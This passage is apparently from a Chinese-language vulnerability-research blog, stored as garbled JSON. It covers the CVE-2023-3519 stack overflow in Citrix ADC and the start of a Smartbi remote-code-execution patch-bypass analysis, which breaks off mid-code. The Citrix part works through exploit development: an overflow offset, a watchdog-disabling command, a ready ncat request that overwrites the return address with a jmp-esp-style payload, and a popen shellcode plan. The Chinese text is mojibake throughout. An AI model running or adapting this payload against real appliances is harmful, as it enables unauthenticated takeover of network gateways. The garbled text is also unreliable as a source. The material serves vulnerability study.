++v4; } while ( (unsigned __int64)a1 \u0026lt; v5 ); } return (unsigned int)((_DWORD)v4 - (_DWORD)a2); } åœ¨å¾ªç¯ä¸­ï¼Œå†™å…¥çš„æ•°ç»„æ¥æºäºä¼ å…¥çš„å‚æ•°a2ï¼Œå¹¶ä¸”do whileå¾ªç¯ç»“æŸæ˜¯é€šè¿‡åˆ¤æ–­a1 \u0026lt; v5ï¼Œv5 = \u0026amp;a1[a3];a1æ˜¯ä¼ å…¥çš„charæ•°ç»„ï¼Œa3æ˜¯ä¼ å…¥çš„intã€‚å‘ä¸Šè¿½æº¯è°ƒç”¨å‚æ•°æ¥æºã€‚ ns_aaa_saml_url_decodeå‡½æ•°çš„v5æœ€ç»ˆæ¥æºäºä¼ å…¥çš„a1å‚æ•°ï¼Œa2ä¸ºä¼ å…¥çš„å‚æ•°ï¼Œv25æ¥æºäº*(a1+174)ã€‚ä¸éš¾çŒœæµ‹a1åº”ä¸ºä¸€ä¸ªç»“æ„ä½“æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæŒ‡å‘çš„ç»“æ„ä½“ä¸­å­˜å‚¨äº†æŒ‡å‘å­˜å‚¨è¯·æ±‚urlçš„charæ•°ç»„åŠè¯¥æ•°ç»„çš„é•¿åº¦ï¼Œè¯¥æ®µä»£ç ä¸ºè§£æurlçš„å„ä¸ªå‚æ•°ï¼Œå¹¶æ ¹æ®å‚æ•°ä¸åŒè¿›è¡Œçš„æ“ä½œã€‚\n__int64 __fastcall ns_aaa_gwtest_get_event_and_target_names(__int64 a1, __int64 a2, unsigned int *a3) { unsigned int v3; // r13d unsigned int *v4; // rbx __int64 v5; // r12 unsigned int v6; // r14d __int64 v7; // r13 __int64 v8; // r12 int v9; // r8d __int64 v10; // r10 unsigned __int16 v11; // ax __int64 v12; // rcx unsigned int v13; // eax int v14; // ecx bool v15; // cf int v16; // eax __int64 v17; // rcx int v19; // r14d __int64 v20; // rax int v21; // ecx unsigned int v22; // r13d __int64 v23; // rax unsigned int v24; // edx __int64 v25; // rdx int v26; // eax unsigned int v27; // [rsp+0h] [rbp-50h] __int64 v28; // [rsp+18h] [rbp-38h] BYREF __int64 v29; // [rsp+20h] [rbp-30h] v3 = *(unsigned __int16 *)(a1 + 174); v27 = v3 - 17; if ( v3 \u0026lt; 0x20 ) { v4 = a3; v5 = 0LL; v6 = 1441793; v7 = 0LL; goto LABEL_7; } v8 = *(_QWORD *)(a1 + 36); v29 = v8 + 17; v4 = a3; if ( (unsigned int)strncmp(\u0026#34;event=\u0026#34;, v8 + 17, 6LL) ) { v6 = 1441800; LABEL_5: v5 = 0LL; goto LABEL_6; } if ( !(unsigned int)strncmp(v8 + 23, \u0026#34;start\u0026amp;\u0026#34;, 6LL) ) { v19 = -29; v20 = 29LL; v21 = 1; } else { if ( (unsigned int)strncmp(v8 + 23, \u0026#34;done\u0026amp;\u0026#34;, 5LL) ) { v6 = 1441801; goto LABEL_5; } v19 = -28; v20 = 28LL; v21 = 2; } *v4 = v21; v5 = v20 + v8; v22 = v3 + v19; v6 = 1441802; v27 = v22; if ( (unsigned int)strncmp(\u0026#34;target=\u0026#34;, v5, 7LL) ) goto LABEL_6; v23 = _wrap_memchr(v5 + 7, 38LL, (int)(v22 - 7)); v24 = v22 - 7; v25 = v24 + 1; if ( (_DWORD)v25 != v22 - 6 ) { LABEL_6: v7 = v29; goto LABEL_7; } v26 = ns_aaa_saml_url_decode(v5 + 7, a2, v25); ns_aaa_gwtest_get_event_and_target_namesç”±ns_aaa_gwtest_get_valid_fsso_serverè°ƒç”¨ï¼Œå…¶ä¸­v15ä¸ºæ ˆå†…charæ•°ç»„ï¼Œå¤§å°ä¸º128å­—èŠ‚ã€‚åˆ†æåˆ°è¿™å¯ä»¥çŒœæµ‹ï¼Œç”±äºè¯·æ±‚urlçš„å‚æ•°å¯æ§ï¼Œè‡ªç„¶è¯·æ±‚urlé•¿åº¦ä¹Ÿå¯æ§ï¼Œè€Œv15è¿™ä¸ªæ•°ç»„ä¸ºæ ˆå†…æ•°ç»„ï¼Œå¤§å°ä¸º128å­—èŠ‚ã€‚ns_aaa_saml_url_decode_innerå‡½æ•°ä¸­å¾ªç¯æ¬¡æ•°ç”±urlé•¿åº¦å†³å®šï¼Œä¹Ÿå°±æ˜¯å¯ä»¥æ§åˆ¶å†™å…¥v15æ•°ç»„çš„å­—èŠ‚æ•°ï¼Œå¦‚æœurlè¿‡é•¿åˆ™åœ¨å¾ªç¯æ—¶å†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡128å­—èŠ‚ï¼Œé€ æˆæ ˆæº¢å‡ºã€‚\n__int64 __fastcall ns_aaa_gwtest_get_valid_fsso_server(__int64 a1) { __int64 v1; // rbx unsigned int v2; // eax int v4; // r8d int v5; // r9d unsigned __int16 v6; // ax int v7; // r8d int v8; // r9d __int64 v9; // rcx unsigned int v10; // eax int v11; // ecx bool v12; // cf int v13; // eax __int64 v14; // rcx __int128 v15[8]; // [rsp+10h] [rbp-A0h] BYREF unsigned int v16; // [rsp+94h] [rbp-1Ch] BYREF __int64 v17; // [rsp+98h] [rbp-18h] BYREF int v18[3]; // [rsp+A4h] [rbp-Ch] BYREF memset(v15, 0, sizeof(v15)); v16 = 0; v18[0] = 0; if ( (unsigned int)ns_aaa_gwtest_get_event_and_target_names(a1, (__int64)v15, \u0026amp;v16) ) å‘ä¸Šè¿½æº¯è°ƒç”¨åˆ°è¯¥å‡½æ•°éœ€è¦çš„è·¯å¾„ï¼Œns_aaa_gwtest_get_valid_fsso_serverç”±ns_aaa_gwtest_handlerè°ƒç”¨ï¼Œåœ¨ä»£ç ä¸­å¯ä»¥çœ‹åˆ°å½“è¯·æ±‚url+8å¤„ä¸ºformsssoæ—¶æ‰ä¼šè¿›å…¥åˆ°è°ƒç”¨ns_aaa_gwtest_get_valid_fsso_serverå‡½æ•°çš„é€»è¾‘ã€‚\n__int64 __fastcall ns_aaa_gwtest_handler(__int64 a1, __int64 a2, __int64 a3, __int64 a4) { __int64 v5; // r15 __int64 v6; // rax __int64 v7; // rcx _QWORD *v8; // rax unsigned int v9; // r13d __int64 valid_fsso_server; // rax __int64 v11; // rbx unsigned int v12; // r14d __int64 v13; // rax __int64 is_valid_auth_action; // rax __int64 v15; // rax __int64 v16; // rcx unsigned int v17; // eax __int64 v18; // rcx __int64 v20; // rcx __int64 v21; // rdx __int64 v22; // [rsp+0h] [rbp-30h] v5 = a3; v6 = ns_async_ctx; if ( ns_async_ctx ) { v20 = (unsigned int)ns_async_callers_context_size; if ( *(_DWORD *)(ns_async_ctx + (unsigned int)ns_async_callers_context_size + 108) != 1486 ) panic_0(\u0026#34;Incorrect context id in ASYNC_SAVE_CTX\u0026#34;, a2, a3, (unsigned int)ns_async_callers_context_size, a4); v12 = *(_DWORD *)(ns_async_ctx + (unsigned int)ns_async_callers_context_size + 112); v11 = *(_QWORD *)(ns_async_ctx + (unsigned int)ns_async_callers_context_size + 116); *(_DWORD *)(ns_async_ctx + (unsigned int)ns_async_callers_context_size + 112) = 0; *(_QWORD *)(v6 + v20 + 116) = 0LL; goto LABEL_41; } v7 = *(_QWORD *)(a2 + 36); v8 = (_QWORD *)(v7 + 8); a3 = *(_DWORD *)(v7 + 8) | 0x20202020u; v9 = 32; if ( (int)a3 \u0026lt;= \u0026#39;lmar\u0026#39; ) { if ( (_DWORD)a3 == \u0026#39;?dck\u0026#39; ) { v12 = 7; v11 = 0LL; goto LABEL_41; } if ( (_DWORD)a3 == 1752462689 ) { if ( (*v8 | 0x2020202020202020LL) != \u0026#39;vreshtua\u0026#39; || (*(unsigned __int16 *)(v7 + 16) | 0x2020) != 29285 || (*(_BYTE *)(v7 + 18) | 0x20) != 63 ) { return v9; } v22 = a4; is_valid_auth_action = ns_aaa_gwtest_is_valid_auth_action(a2); if ( is_valid_auth_action ) { v11 = is_valid_auth_action; v12 = 1; goto LABEL_39; } return 3907; } if ( (_DWORD)a3 != \u0026#39;lluf\u0026#39; ) return v9; v12 = 9 * ((*(_BYTE *)(v7 + 12) | 0x20) == 63); LABEL_20: v11 = 0LL; if ( !v12 ) return v9; goto LABEL_41; } if ( (int)a3 \u0026lt;= \u0026#39;nahb\u0026#39; ) { if ( (_DWORD)a3 == \u0026#39;lmas\u0026#39; ) { if ( (*(_WORD *)(v7 + 12) | 0x2020) == (*(_WORD *)\u0026#34;SP?\u0026#34; | 0x2020) \u0026amp;\u0026amp; (*(_BYTE *)(v7 + 14) | 0x20) == (aSamlsp_0[6] | 0x20) ) { v22 = a4; v13 = ns_aaa_gwtest_is_valid_auth_action(a2); if ( v13 ) { v11 = v13; v12 = 3; goto LABEL_39; } } else { if ( (*(_WORD *)(v7 + 12) | 0x2020) != (*(_WORD *)\u0026#34;IdP?\u0026#34; | 0x2020) || (*(_BYTE *)(v7 + 14) | 0x20) != (aSamlidp_1[6] | 0x20) ) { return v9; } v22 = a4; v15 = ns_aaa_gwtest_is_valid_auth_action(a2); if ( v15 ) { v11 = v15; v12 = 4; goto LABEL_39; } } } else { if ( (_DWORD)a3 != \u0026#39;mrof\u0026#39; || (*v8 | 0x2020202020202020LL) != \u0026#39;osssmrof\u0026#39; || (*(_BYTE *)(v7 + 16) | 0x20) != 63 ) return v9; v22 = a4; valid_fsso_server = ns_aaa_gwtest_get_valid_fsso_server(a2); ns_aaa_gwtest_handlerç”±ns_vpn_process_unauthenticated_requestå‡½æ•°è°ƒç”¨ï¼Œåœ¨ns_vpn_process_unauthenticated_requestå‡½æ•°ä¸­æœ‰å¦‚ä¸‹é€»è¾‘ï¼Œå½“è¯·æ±‚è·¯å¾„ä¸º/gwtest/æ—¶è¿›å…¥è°ƒç”¨åˆ°ç›®æ ‡å‡½æ•°çš„é€»è¾‘ã€‚\nif ( v51 == 1702131559 ) { if ( (*(_QWORD *)v26 | \u0026#39; \u0026#39;) != \u0026#39;/tsetwg/\u0026#39; ) goto LABEL_2888; LABEL_437: if ( ns_async_ctx \u0026amp;\u0026amp; *(_DWORD *)(ns_async_ctx + (unsigned int)ns_async_callers_context_size + 108) != 652 ) panic_0( \u0026#34;Async context ID does not match expected context ID NS_ASYNC_CTX_AAA_UNAUTH_GWTEST\u0026#34;, a2, v25, (unsigned int)ns_async_callers_context_size, v26); v25 = (unsigned int)(ns_async_callers_context_size + 192); ns_async_callers_context_size += 192; v30 = v1891; if ( ns_async_ctx ) { if ( *(_DWORD *)(ns_async_ctx + 8) != -87101427 ) goto LABEL_4683; if ( (unsigned int)v25 \u0026lt; *(_DWORD *)(ns_async_ctx + 104) ) { a2 = (unsigned int)v25; v25 = (unsigned int)(*(_DWORD *)(ns_async_ctx + (unsigned int)v25 + 108) - 172); if ( (unsigned int)v25 \u0026gt;= 0x611 ) goto LABEL_759; } } v164 = ns_aaa_gwtest_handler((__int64)v1896, v1897, 0LL, v1891); ç»¼ä¸Šå¯ä»¥æ€»ç»“åˆ°è°ƒç”¨åˆ°æ¼æ´å‡½æ•°ns_aaa_saml_url_decode_inneræ‰€éœ€è¦çš„urlä¸ºï¼š\nhttp://target/gwtest/formssso?event=start\u0026amp;target=[overflow char] åªéœ€è¦è®©[overflow char]è¿‡é•¿å³å¯æº¢å‡ºåœ¨ns_aaa_gwtest_get_valid_fsso_serverå‡½æ•°å†…çš„charæ•°ç»„ï¼Œé€ æˆæº¢å‡ºã€‚æŸ¥çœ‹nsppeé˜²æŠ¤ï¼Œå¯ä»¥å‘ç°PIE,CANARYéƒ½æ²¡å¼€ï¼Œåªéœ€è¦åˆ©ç”¨æ ˆæº¢å‡ºå†™å…¥shellcodeç„¶åjmp espå³å¯æ‰§è¡Œshellcodeã€‚\n# checksec --file=nsppe_unpatched RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE No RELRO Canary found NX disabled No PIE No RPATH No RUNPATH 68527 Symbols No 0 0 nsppe_unpatched åŠ¨æ€è°ƒè¯• æ‰¾åˆ°nsppeè¿›ç¨‹\nroot@citrix3# ps aux | grep nsppe root 457 100.0 43.2 693320 693560 - Rs 19:10 223:34.32 nsppe (NSPPE-00) ç¦ç”¨çœ‹é—¨ç‹—ï¼Œä½¿ç”¨å‘½ä»¤ç¦æ­¢å‘é€è¯¥ä¿¡å·\nroot@citrix3# nspf help Usage: \u0026#39;/netscaler/nspf ((\u0026lt;process_name\u0026gt; | \u0026lt;pid\u0026gt;) \u0026lt;action\u0026gt; | query)\u0026#39; where \u0026lt;process_name\u0026gt; is one of: NSPPE-00 aslearn awsconfig bgpd de imi isisd metricscollectomonuploadd nsaaad nsaggregatord nscfsyncd nsclfsyncd nsclusterd nsconfigd nscopo nsfsyncd nsgslbautosyncnslcd nslped nsm nsnetsvc nsrised nstraceaggregatnsumond ospf6d ospfd ptpd ripd ripngd snmpd syshealthd root@citrix3# /netscaler/nspf nsppe-00 pbmonitor 0 nspf NSPPE-00 pbmonitor 0 Removing pitboss monitor on process NSPPE-00 pid 37387 ä½¿ç”¨Citrix ADCè‡ªå¸¦çš„gdbé™„åŠ è°ƒè¯•nsppe\ngdb /netscaler/nsppe 461 ä½¿ç”¨pattern_creat.rbåˆ›å»ºå­—ç¬¦ä¸²\nâ”Œâ”€â”€(rootã‰¿kali)-[~] â””â”€# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag å‘é€payloadï¼Œè§¦å‘æ¼æ´ï¼Œæ­¤æ—¶rspä¸º6641376641366641ï¼Œå¯¹åº”offsetä¸º168ï¼Œä¹Ÿå°±æ˜¯168å¼€å§‹è¦†ç›–rsp å‘é€payloadï¼Œè§¦å‘æ¼æ´ï¼Œæ­¤æ—¶ripæŒ‡å‘0xccæŒ‡ä»¤åœ°å€ï¼Œgdbæ–­ä¸‹\necho -ne \u0026#39;GET /gwtest/formssso?event=start\u0026amp;target=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x62\\x8c\\x6d\\x00\\x00\\x00\\x00\\x00\\xcc HTTP/1.1\\r\\nHost: 192.168.52.108\\r\\n\\r\\n\u0026#39; | ncat --ssl 192.168.52.108 443 åœ¨gdbä¸­å¯ä»¥çœ‹åˆ°ç¼“å†²åŒºä½äºrbp-0xa0å¤„ã€‚ é€šè¿‡è°·æ­Œï¼ŒçŸ¥é“åœ¨Citrix ADCä¸­ï¼Œnsppeæ˜¯ç½‘ç»œå­ç³»ç»Ÿï¼Œä¸€å½“nsppeè¿›ç¨‹downäº†ï¼Œä¼šé€ æˆç³»ç»Ÿæ— æ³•å¤„ç†ç½‘ç»œè¯·æ±‚ï¼Œæœ€ç›´è§‚çš„è¡¨ç°å°±æ˜¯å½“sshè¿æ¥ç›®æ ‡ç³»ç»Ÿå¹¶ä½¿ç”¨gdbè°ƒè¯•nsppeè¿›ç¨‹çš„æ—¶å€™ï¼Œsshä¼šå¡æ­»ï¼Œè€Œåé€€å‡ºï¼Œå› ä¸ºæœåŠ¡å™¨çš„ç½‘ç»œå­ç³»ç»Ÿå¤„äºè°ƒè¯•çŠ¶æ€ï¼Œæ²¡åŠæ³•å¤„ç†ç½‘ç»œè¯·æ±‚ã€‚\næ‰€ä»¥åœ¨æ•´ä¸ªåˆ©ç”¨è¿‡ç¨‹ä¸­ï¼Œä¸ºäº†ä¿è¯èƒ½å¤Ÿè·å–åˆ°shell/ä¿æ´»ç³»ç»Ÿï¼Œè¦ä¿è¯nsppeè¿›ç¨‹ä¸ä¼šæŒ‚æ‰ã€‚é€šè¿‡shellcodeè°ƒç”¨popenå‡½æ•°ç„¶åæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¹¶è¿”å›åˆ°ä¸Šå±‚è°ƒç”¨æ ˆï¼ˆä¿è¯è¯·æ±‚æ­£å¸¸è¿”å›ï¼‰ã€‚\nä¹‹åå°±æ˜¯å¸¸è§„åˆ™shellcodeç¼–å†™äº†ï¼Œç›´æ¥ä½¿ç”¨äºŒè¿›åˆ¶æ–‡ä»¶å†…ç¡¬ç¼–ç çš„popenå‡½æ•°åœ°å€å³å¯ã€‚éœ€è¦æ³¨æ„çš„å°±æ˜¯nsppeå†…å®ç°çš„urlè§£ç é€»è¾‘æœ‰ç‚¹ä¸å¤ªä¸€æ ·ï¼Œ å…·ä½“å‚è€ƒå‚è€ƒé“¾æ¥ï¼Œè¿™é‡Œå°±ä¸è¯¦ç»†å±•å¼€äº†ã€‚\nå°ç»“ æ•´ä¸ªæ¼æ´äº§ç”Ÿå’Œåˆ©ç”¨åŸç†ç®€å•ç›´æ¥ï¼Œå› ä¸ºnsppeæ²¡æœ‰å¼€å¯ä»»ä½•æº¢å‡ºé˜²æŠ¤æªæ–½ï¼Œç›´æ¥ä½¿ç”¨jmp espå³å¯ï¼Œè®©æˆ‘æƒ³èµ·äº†è¿™ä¸ªç»å…¸è¡¨æƒ…åŒ… ä¸çŸ¥é“æ˜¯ä¸æ˜¯å› ä¸ºè¿™ä¸ªå¼•æ“èµ·æºæ¯”è¾ƒä¹…çš„åŸå› ï¼Œnsppeæ²¡æœ‰å»é™¤è°ƒè¯•ç¬¦å·ï¼Œå¯¹äºç†è§£åŸç†å’Œè°ƒè¯•expéƒ½æœ‰éå¸¸å¤§çš„å¸®åŠ©ã€‚\nç”³è¯·å¼€å‘äººå‘˜è®¸å¯\nhttps://blog.assetnote.io/2023/07/24/citrix-rce-part-2-cve-2023-3519/\nCreated at 2023-07-27T10:48:40+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/smartbi-rce/","title":"Smartbi Rce","tags":[],"description":"","content":"åŸºæœ¬ä¿¡æ¯ Smartbiæ˜¯å¹¿å·æ€è¿ˆç‰¹è½¯ä»¶æœ‰é™å…¬å¸æ——ä¸‹çš„å•†ä¸šæ™ºèƒ½BIå’Œæ•°æ®åˆ†æå“ç‰Œï¼Œä¸ºä¼ä¸šå®¢æˆ·æä¾›ä¸€ç«™å¼å•†ä¸šæ™ºèƒ½è§£å†³æ–¹æ¡ˆã€‚Smartbiå¤§æ•°æ®åˆ†æäº§å“èåˆBIå®šä¹‰çš„æ‰€æœ‰é˜¶æ®µï¼Œå¯¹æ¥å„ç§ä¸šåŠ¡æ•°æ®åº“ã€æ•°æ®ä»“åº“å’Œå¤§æ•°æ®åˆ†æå¹³å°ï¼Œè¿›è¡ŒåŠ å·¥å¤„ç†ã€åˆ†ææŒ–æ˜å’Œå¯è§†åŒ–å±•ç°ï¼›æ»¡è¶³æ‰€æœ‰ç”¨æˆ·çš„å„ç§æ•°æ®åˆ†æåº”ç”¨éœ€æ±‚ï¼Œå¦‚å¤§æ•°æ®åˆ†æã€å¯è§†åŒ–åˆ†æã€æ¢ç´¢å¼åˆ†æã€å¤æ‚æŠ¥è¡¨ã€åº”ç”¨åˆ†äº«ç­‰ç­‰ã€‚\nSmartbiå¤§æ•°æ®åˆ†æå¹³å°å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæœªç»èº«ä»½è®¤è¯çš„è¿œç¨‹æ”»å‡»è€…å¯åˆ©ç”¨stubæ¥å£æ„é€ è¯·æ±‚ç»•è¿‡è¡¥ä¸é™åˆ¶ï¼Œè¿›è€Œæ§åˆ¶JDBC URLï¼Œæœ€ç»ˆå¯å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œæˆ–ä¿¡æ¯æ³„éœ²ã€‚\nå¼•ç”¨è‡ª\rå¥‡å®‰ä¿¡NOX\nå½±å“ç‰ˆæœ¬ V7\u0026lt;= Smartbi \u0026lt;= V10.5.8\nç¯å¢ƒæ­å»º å®˜ç½‘ä¸‹è½½Smartbi V10.5.8å³å¯ï¼Œç›´æ¥å®‰è£…ã€‚\næŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• è§£åŒ…å®˜ç½‘æä¾›çš„è¡¥ä¸åŒ…ï¼Œå¯ä»¥å‘ç°å¦‚ä¸‹ï¼š\n{ \u0026#34;version\u0026#34;: \u0026#34;1.0\u0026#34;, \u0026#34;date\u0026#34;: \u0026#34;2023-02-28 15:00:00\u0026#34;, \u0026#34;patches\u0026#34;: { \u0026#34;PATCH_20230228\u0026#34;: { \u0026#34;desc\u0026#34;: \u0026#34;ä¿®å¤äº†åˆ©ç”¨stubæ¥å£å¯¹ â€˜DB2 å‘½ä»¤æ‰§è¡Œæ¼æ´â€™ è¡¥ä¸è¿›è¡Œç»•è¿‡çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ (Patch.20230228 @2023-02-28)\u0026#34;, \u0026#34;desc_zh_TW\u0026#34;: \u0026#34;ä¿®å¾©äº†åˆ©ç”¨stubæ¥å£å° â€˜DB2 å‘½ä»¤åŸ·è¡Œæ¼æ´â€™ è£œä¸é€²è¡Œç¹éçš„é ç¨‹å‘½ä»¤åŸ·è¡Œæ¼æ´ (Patch.20230228 @2023-02-28)\u0026#34;, \u0026#34;desc_en\u0026#34;: \u0026#34;Fixed a remote command execution vulnerability in DB2 that used the stub interface (Patch.20230228 @2023-02-28)\u0026#34;, \u0026#34;urls\u0026#34;: [{ \u0026#34;url\u0026#34;: \u0026#34;*.stub\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;RejectStubPostPatchRule\u0026#34; }] }] }, \u0026#34;PATCH_20221122\u0026#34;: { \u0026#34;desc\u0026#34;: \u0026#34;ä¿®å¤äº† DB2 å‘½ä»¤æ‰§è¡Œæ¼æ´ (Patch.20221122 @2022-11-22)\u0026#34;, \u0026#34;desc_zh_TW\u0026#34;: \u0026#34;ä¿®å¾©äº† DB2 å‘½ä»¤åŸ·è¡Œæ¼æ´ (Patch.20221122 @2022-11-22)\u0026#34;, \u0026#34;desc_en\u0026#34;: \u0026#34;Fixed a DB2 command execution vulnerability. (Patch.20221122 @2022-11-22)\u0026#34;, \u0026#34;urls\u0026#34;: [{ \u0026#34;url\u0026#34;: \u0026#34;/vision/RMIServlet\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;className\u0026#34;: \u0026#34;DataSourceService\u0026#34;, \u0026#34;methodName\u0026#34;: \u0026#34;testConnectionList\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;RejectRMIParamsStringsPatchRule\u0026#34;, \u0026#34;strings\u0026#34;: [\u0026#34;clientRerouteServerListJNDIName\u0026#34;] },{ \u0026#34;className\u0026#34;: \u0026#34;DataSourceService\u0026#34;, \u0026#34;methodName\u0026#34;: \u0026#34;testConnection\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;RejectRMIParamsStringsPatchRule\u0026#34;, \u0026#34;strings\u0026#34;: [\u0026#34;clientRerouteServerListJNDIName\u0026#34;] }] }] }, å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¡¥ä¸åŒ…å¯¹ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼*.stub çš„urlè¿›è¡Œäº†å¤„ç†ï¼Œå†æ ¹æ®è¡¥ä¸æè¿°ä¸éš¾å‘ç°å‰ä¸€ä¸ªè¡¥ä¸è¡¥çš„æ¼æ´ï¼šDB2 å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚æ­¤å¤„çš„æ¼æ´åº”è¯¥æ˜¯å¯¹å…¶è¿›è¡Œäº†ç»•è¿‡ã€‚\nè½¬åˆ°web.xmlé‡Œé¢ï¼Œ*.stubæ˜¯ç”±RMIServletè¿›è¡Œå¤„ç†çš„ï¼Œä¸”åªæœ‰ä¸¤ä¸ªfilterã€‚\n\u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;RMIServlet\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.stub\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;CacheFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.stub\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;GZIPFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.stub\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; ç»§ç»­æŸ¥çœ‹web.xmlï¼Œä¸éš¾å‘ç°ä¸€äº›æ•æ„Ÿæ¥å£å‡è¦ç»è¿‡CheckIsLoggedFilterï¼Œç»“åˆåç¼–è¯‘çš„æºç ï¼ŒçŒœæµ‹æ­¤filterä¸ºé‰´æƒfilter\n\u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;CheckIsLoggedFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/vision/ExportServlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;CheckIsLoggedFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/vision/ExportHttpServlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;CheckIsLoggedFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/vision/DownloadExcelServlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;CheckIsLoggedFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/vision/MigrateServlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; public class CheckIsLoggedFilter implements javax.servlet.Filter { private static IExtendCustomFilter customFilterChecker; private static final Logger LOG = Logger.getLogger(CheckIsLoggedFilter.class); private static final Map\u0026lt;String, List\u0026lt;String\u0026gt;\u0026gt; AUTHORITYMAP = new HashMap(); /* loaded from: smartbi-FreeQuery.jar:smartbi/freequery/filter/CheckIsLoggedFilter$IExtendCustomFilter.class */ public interface IExtendCustomFilter { int authorityFiltering(String str, String str2, HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse); } public void destroy() { } /* JADX WARN: Removed duplicated region for block: B:137:0x060f A[RETURN] */ /* Code decompiled incorrectly, please refer to instructions dump. To view partially-correct code enable \u0026#39;Show inconsistent code\u0026#39; option in preferences */ public void doFilter(javax.servlet.ServletRequest r9, javax.servlet.ServletResponse r10, javax.servlet.FilterChain r11) throws java.io.IOException, javax.servlet.ServletException { /* Method dump skipped, instructions count: 1568 To view this dump change \u0026#39;Code comments level\u0026#39; option to \u0026#39;DEBUG\u0026#39; */ throw new UnsupportedOperationException(\u0026#34;Method not decompiled: smartbi.freequery.filter.CheckIsLoggedFilter.doFilter(javax.servlet.ServletRequest, javax.servlet.ServletResponse, javax.servlet.FilterChain):void\u0026#34;); } public static void handleAutoLogin(HttpServletRequest request) { if (FreeQueryModule.getInstance().getUserManagerModule().isLogged()) { return; } String headerUserName = Bootstrap.getHeaderUserName(request); if (StringUtil.isNullOrEmpty(headerUserName)) { return; } IState state = (IState) request.getSession().getAttribute(\u0026#34;state\u0026#34;); boolean isLogged = (state == null || state.getUser() == null) ? false : true; if (!isLogged) { String headerPassword = Bootstrap.getHeaderPassword(request); if (headerPassword == null) { headerPassword = SmartbiXDataSetUtil.OTHER; } FreeQueryModule.getInstance().getStateModule().doStartRequest(request); boolean isAutoLogin = FreeQueryModule.getInstance().getUserManagerModule().login(headerUserName, headerPassword); if (isAutoLogin) { request.setAttribute(\u0026#34;isNeedAutoLogout\u0026#34;, \u0026#34;true\u0026#34;); } } } è€Œ*.stubå¹¶æœªç»è¿‡è¿™ä¸ªfilterçš„å¤„ç†ï¼Œä¹Ÿå°±æ˜¯æœªæˆæƒå³å¯è®¿é—®ã€‚\nè½¬åˆ°Smartbiçš„RMIServletä¸­æœ‰å¦‚ä¸‹ä»£ç ï¼Œè¿›è¡ŒGETè¯·æ±‚æ—¶ï¼Œæºå¸¦jsonpCallbackå‚æ•°å³å¯è½¬åˆ°doPostæ–¹æ³•ï¼Œè¯¥æ–¹æ³•é€šè¿‡RMIUtil.parseRMIInfoæ–¹æ³•è·å–RMIä¿¡æ¯ï¼Œè·Ÿè¿›ã€‚\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException { String uri = req.getRequestURI(); try { String jsonpCallback = req.getParameter(\u0026#34;jsonpCallback\u0026#34;); if (StringUtil.isNullOrEmpty(jsonpCallback)) { ... } else { doPost(req, resp); } } catch (IOException e) { LOG.error(uri + \u0026#34;\\n\u0026#34; + e.getMessage(), e); } } /* JADX WARN: Finally extract failed */ @Override // smartbi.framework.rmi.IRMIServlet public void doPost(HttpServletRequest request, HttpServletResponse resp) throws ServletException, IOException { RMIModule.getInstance().doStartRequest(request); TraceConfig traceConfig = (TraceConfig) 